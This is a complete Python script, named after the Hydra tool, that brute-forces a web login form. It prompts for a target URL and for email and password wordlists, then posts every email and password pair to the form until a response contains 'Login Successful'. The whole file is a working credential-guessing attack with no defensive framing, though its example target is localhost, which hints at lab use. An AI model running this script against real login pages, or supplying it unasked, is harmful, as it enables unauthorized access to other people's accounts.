import requests
import sys
import time
import os

def load_wordlist(filepath):
    try:
        with open(filepath, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[!] Error: File '{filepath}' not found.")
        return None

def run_hydra():
    # Ask for inputs interactively
    target_url = input("Enter target URL (e.g., http://localhost:8000/): ").strip()
    email_file = input("Enter email file path (e.g., email.txt): ").strip()
    password_file = input("Enter password file path (e.g., password.txt): ").strip()

    # Validate file existence
    emails = load_wordlist(email_file)
    passwords = load_wordlist(password_file)
    
    if emails is None or passwords is None:
        print("[!] Exiting due to missing wordlist file.")
        return

    print(f"\n[*] Targeting: {target_url}")
    print(f"[*] Loaded {len(emails)} emails and {len(passwords)} passwords.\n")

    for email in emails:
        print(f"Testing {email}")
        
        for password in passwords:
            payload = {
                "email": email,
                "password": password
            }
            
            try:
                # Send the POST request to the specified URL
                response = requests.post(target_url, data=payload, timeout=5)
                
                # Check response behavior for validation
                if "Login Successful" in response.text:
                    print(f"Password:{password} Correct")
                    return 
                else:
                    print(f"Password:{password} Wrong")
                
            except requests.exceptions.RequestException as e:
                print(f"[!] Connection Error: {e}")
                return
            
            time.sleep(0.1)

if __name__ == "__main__":
    run_hydra()
